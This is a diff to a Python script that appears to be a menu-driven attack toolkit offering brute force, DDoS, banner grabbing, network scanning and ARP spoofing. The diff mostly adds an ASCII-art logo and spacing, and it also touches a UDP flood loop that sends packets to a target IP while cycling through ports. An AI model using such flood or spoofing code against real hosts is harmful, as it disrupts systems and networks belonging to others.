@@ -1,9 +1,28 @@
 import os
+import pyfiglet
 
+def logo():
+
+    print("_______  __    __  ______  __    __ ________  ______  __       __      ________ _______   ______  __       __ ________ __       __  ______  _______  __    __   ")
+    print("|       \|  \  |  \/      \|  \  |  \        \/      \|  \     /  \    |        \       \ /      \|  \     /  \        \  \  _  |  \/      \|       \|  \  /  \ ")
+    print("| ▓▓▓▓▓▓▓\ ▓▓  | ▓▓  ▓▓▓▓▓▓\ ▓▓\ | ▓▓\▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓\ ▓▓\   /  ▓▓    | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓\   /  ▓▓ ▓▓▓▓▓▓▓▓ ▓▓ / \ | ▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\ ▓▓ /  ▓▓ ")
+    print("| ▓▓__/ ▓▓ ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓▓\| ▓▓  | ▓▓  | ▓▓  | ▓▓ ▓▓▓\ /  ▓▓▓    | ▓▓__   | ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓▓\ /  ▓▓▓ ▓▓__   | ▓▓/  ▓\| ▓▓ ▓▓  | ▓▓ ▓▓__| ▓▓ ▓▓/  ▓▓  ")
+    print("| ▓▓    ▓▓ ▓▓    ▓▓ ▓▓    ▓▓ ▓▓▓▓\ ▓▓  | ▓▓  | ▓▓  | ▓▓ ▓▓▓▓\  ▓▓▓▓    | ▓▓  \  | ▓▓    ▓▓ ▓▓    ▓▓ ▓▓▓▓\  ▓▓▓▓ ▓▓  \  | ▓▓  ▓▓▓\ ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓  ▓▓   ")
+    print("| ▓▓▓▓▓▓▓| ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ ▓▓\▓▓ ▓▓  | ▓▓  | ▓▓  | ▓▓ ▓▓\▓▓ ▓▓ ▓▓    | ▓▓▓▓▓  | ▓▓▓▓▓▓▓\ ▓▓▓▓▓▓▓▓ ▓▓\▓▓ ▓▓ ▓▓ ▓▓▓▓▓  | ▓▓ ▓▓\▓▓\▓▓ ▓▓  | ▓▓ ▓▓▓▓▓▓▓\ ▓▓▓▓▓\   ")
+    print("| ▓▓     | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓ \▓▓▓▓  | ▓▓  | ▓▓__/ ▓▓ ▓▓ \▓▓▓| ▓▓    | ▓▓     | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓ \▓▓▓| ▓▓ ▓▓_____| ▓▓▓▓  \▓▓▓▓ ▓▓__/ ▓▓ ▓▓  | ▓▓ ▓▓ \▓▓\  ")
+    print("| ▓▓     | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  \▓▓▓  | ▓▓   \▓▓    ▓▓ ▓▓  \▓ | ▓▓    | ▓▓     | ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  \▓ | ▓▓ ▓▓     \ ▓▓▓    \▓▓▓\▓▓    ▓▓ ▓▓  | ▓▓ ▓▓  \▓▓\ ")
+    print(" \▓▓      \▓▓   \▓▓\▓▓   \▓▓\▓▓   \▓▓   \▓▓    \▓▓▓▓▓▓ \▓▓      \▓▓     \▓▓      \▓▓   \▓▓\▓▓   \▓▓\▓▓      \▓▓\▓▓▓▓▓▓▓▓\▓▓      \▓▓ \▓▓▓▓▓▓ \▓▓   \▓▓\▓▓   \▓▓ ")
+
+    print("\n\n")                                                                                                       
+    ascii_art = pyfiglet.figlet_format('By Nikit Singh Kanyal', font='banner',width=300)
+    print(ascii_art)
 
 def menu():
-    # os.system('clear') clears the terminal screen
+    os.system('cls') #clears the terminal screen
+    logo()
+    print("\n\n")
     print("Choose an option:")
+    print("\n")
     print("1. Brute Force")
     print("2. DDoS")
     print("3. Banner Grabbing")
@@ -12,6 +31,7 @@ def menu():
     print("6. Network Scanner")
     print("7. ARP Spoof")
     print("0. Exit")
+    print("\n")
 
 
 while True:
@@ -94,16 +114,17 @@ while True:
             sent = 0
             while True:
                 sock.sendto(bytes, (ip, port))
+                print(f"Sent {sent} packet to {ip} through port: {port}")
                 sent += 1
                 port += 1
-                print(f"Sent {sent} packet to {ip} through port: {port}")
+                #print(f"Sent {sent} packet to {ip} through port: {port}")
                 if port == 65534:
                     port = 1
                 try:
-                    input()
-                    break
+                     input()
+                     break
                 except KeyboardInterrupt:
-                    break
+                     break
 
         if __name__ == '__main__':
             main()
